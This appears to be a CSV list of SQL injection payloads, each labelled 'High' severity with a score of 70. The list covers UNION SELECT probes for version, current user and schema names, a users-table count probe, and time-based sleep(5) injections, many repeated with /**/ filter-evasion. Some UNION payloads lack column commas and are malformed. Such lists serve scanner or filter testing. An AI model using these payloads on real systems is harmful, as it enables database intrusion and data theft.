' UNION SELECT NULL version() current_user --,High,70
'/**/UNION/**/SELECT/**/NULL/**/version()/**/current_user/**/--,High,70
'/**/UNION/**/SELECT/**/NULL/**/version()/**/current_user/**/--,High,70
' UNION SELECT NULL version() current_user --,High,70
' UNION SELECT NULL database() schema_name FROM information_schema.schemata --,High,70
' UNION SELECT NULL database() schema_name FROM information_schema.schemata --,High,70
' UNION SELECT NULL database() schema_name FROM information_schema.schemata -- /* test */,High,70
'/**/UNION/**/SELECT/**/NULL/**/database()/**/schema_name/**/FROM/**/information_schema.schemata/**/-- /* test */,High,70
' AND 1=(SELECT COUNT(*) FROM users) --,High,70
'/**/AND/**/1=(SELECT/**/COUNT(*)/**/FROM/**/users)/**/-- /* test */,High,70
'/**/AND/**/1=(SELECT/**/COUNT(*)/**/FROM/**/users)/**/--,High,70
' AND 1=(SELECT COUNT(*) FROM users) --,High,70
1' AND (SELECT sleep(5)) --,High,70
1' AND (SELECT sleep(5)) --,High,70
1' AND (SELECT sleep(5)) --,High,70
1'/**/AND/**/(SELECT/**/sleep(5))/**/--,High,70
' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,High,70
'/**/OR/**/(SELECT/**/CASE/**/WHEN/**/(1=1)/**/THEN/**/SLEEP(5)/**/ELSE/**/1/**/END)/**/--,High,70
' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) -- /* test */,High,70
' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,High,70
' UNION SELECT NULL version() current_user --,High,70
' UNION SELECT NULL version() current_user --,High,70
' UNION SELECT NULL version() current_user --,High,70
'/**/UNION/**/SELECT/**/NULL/**/version()/**/current_user/**/--,High,70
' UNION SELECT NULL database() schema_name FROM information_schema.schemata --,High,70
'/**/UNION/**/SELECT/**/NULL/**/database()/**/schema_name/**/FROM/**/information_schema.schemata/**/--,High,70
' UNION SELECT NULL database() schema_name FROM information_schema.schemata --,High,70
' UNION SELECT NULL database() schema_name FROM information_schema.schemata --,High,70
' AND 1=(SELECT COUNT(*) FROM users) --,High,70
'/**/AND/**/1=(SELECT/**/COUNT(*)/**/FROM/**/users)/**/--,High,70
' AND 1=(SELECT COUNT(*) FROM users) --,High,70
' AND 1=(SELECT COUNT(*) FROM users) --,High,70
1' AND (SELECT sleep(5)) --,High,70
1' AND (SELECT sleep(5)) --,High,70
1'/**/AND/**/(SELECT/**/sleep(5))/**/--,High,70
1' AND (SELECT sleep(5)) --,High,70
' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,High,70
' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,High,70
' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) -- /* test */,High,70
' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,High,70
' UNION SELECT NULL version() current_user --,High,70
'/**/UNION/**/SELECT/**/NULL/**/version()/**/current_user/**/--,High,70
' UNION SELECT NULL version() current_user -- /* test */,High,70
'/**/UNION/**/SELECT/**/NULL/**/version()/**/current_user/**/--,High,70
' UNION SELECT NULL database() schema_name FROM information_schema.schemata --,High,70
'/**/UNION/**/SELECT/**/NULL/**/database()/**/schema_name/**/FROM/**/information_schema.schemata/**/--,High,70
'/**/UNION/**/SELECT/**/NULL/**/database()/**/schema_name/**/FROM/**/information_schema.schemata/**/-- /* test */,High,70
' UNION SELECT NULL database() schema_name FROM information_schema.schemata -- /* test */,High,70
' AND 1=(SELECT COUNT(*) FROM users) --,High,70
'/**/AND/**/1=(SELECT/**/COUNT(*)/**/FROM/**/users)/**/-- /* test */,High,70
' AND 1=(SELECT COUNT(*) FROM users) --,High,70
'/**/AND/**/1=(SELECT/**/COUNT(*)/**/FROM/**/users)/**/--,High,70
1' AND (SELECT sleep(5)) --,High,70
1' AND (SELECT sleep(5)) --,High,70
1'/**/AND/**/(SELECT/**/sleep(5))/**/--,High,70
1'/**/AND/**/(SELECT/**/sleep(5))/**/--,High,70
' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,High,70
' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,High,70
'/**/OR/**/(SELECT/**/CASE/**/WHEN/**/(1=1)/**/THEN/**/SLEEP(5)/**/ELSE/**/1/**/END)/**/--,High,70
'/**/OR/**/(SELECT/**/CASE/**/WHEN/**/(1=1)/**/THEN/**/SLEEP(5)/**/ELSE/**/1/**/END)/**/--,High,70
' UNION SELECT NULL version() current_user --,High,70
'/**/UNION/**/SELECT/**/NULL/**/version()/**/current_user/**/-- /* test */,High,70
'/**/UNION/**/SELECT/**/NULL/**/version()/**/current_user/**/-- /* test */,High,70
' UNION SELECT NULL version() current_user --,High,70
' UNION SELECT NULL database() schema_name FROM information_schema.schemata --,High,70
'/**/UNION/**/SELECT/**/NULL/**/database()/**/schema_name/**/FROM/**/information_schema.schemata/**/-- /* test */,High,70
'/**/UNION/**/SELECT/**/NULL/**/database()/**/schema_name/**/FROM/**/information_schema.schemata/**/-- /* test */,High,70
'/**/UNION/**/SELECT/**/NULL/**/database()/**/schema_name/**/FROM/**/information_schema.schemata/**/--,High,70
' AND 1=(SELECT COUNT(*) FROM users) --,High,70
' AND 1=(SELECT COUNT(*) FROM users) --,High,70
'/**/AND/**/1=(SELECT/**/COUNT(*)/**/FROM/**/users)/**/--,High,70
'/**/AND/**/1=(SELECT/**/COUNT(*)/**/FROM/**/users)/**/--,High,70
1' AND (SELECT sleep(5)) --,High,70
1' AND (SELECT sleep(5)) --,High,70
1' AND (SELECT sleep(5)) --,High,70
1' AND (SELECT sleep(5)) --,High,70
' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,High,70
' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,High,70
' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,High,70
' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) -- /* test */,High,70
' UNION SELECT NULL version() current_user --,High,70
'/**/UNION/**/SELECT/**/NULL/**/version()/**/current_user/**/--,High,70
' UNION SELECT NULL version() current_user --,High,70
' UNION SELECT NULL version() current_user -- /* test */,High,70
